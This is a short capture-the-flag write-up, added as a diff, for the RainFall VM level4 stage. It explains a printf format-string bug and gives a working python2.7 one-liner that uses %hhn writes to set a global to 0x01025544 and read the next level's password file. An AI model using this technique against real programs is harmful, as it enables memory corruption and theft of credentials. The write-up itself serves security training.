@@ -1,0 +1,25 @@
+# level4 → level5
+
+`n` reads a line, then `p` passes it directly to `printf` as a format
+string. Global `m` at `0x08049810` must equal `0x01025544` (16930116).
+The first input word is `printf`'s twelfth apparent argument. Put the four
+successive byte addresses at the start of the input, then use `%hhn` to
+write each byte. The format widths account for the 16 address bytes already
+printed and for wraparound modulo 256:
+
+| Target byte | Desired value | Printed count before write | Additional width |
+| --- | ---: | ---: | ---: |
+| `m[0]` | `0x44` | 16 | 52 |
+| `m[1]` | `0x55` | 68 | 17 |
+| `m[2]` | `0x02` | 85 | 173 |
+| `m[3]` | `0x01` | 258 | 255 |
+
+From the level4 account on the RainFall VM:
+
+```sh
+python2.7 -c 'import struct; print struct.pack("<IIII",0x08049810,0x08049811,0x08049812,0x08049813) + "%12$52c%12$hhn%13$17c%13$hhn%14$173c%14$hhn%15$255c%15$hhn"' | ./level4
+```
+
+The program calls `/bin/cat /home/user/level5/.pass` when the write
+succeeds. Its output can precede buffered `printf` padding in a pipe.
+Inspect `n`, `p`, and `m` with `objdump` or GDB to confirm the addresses.
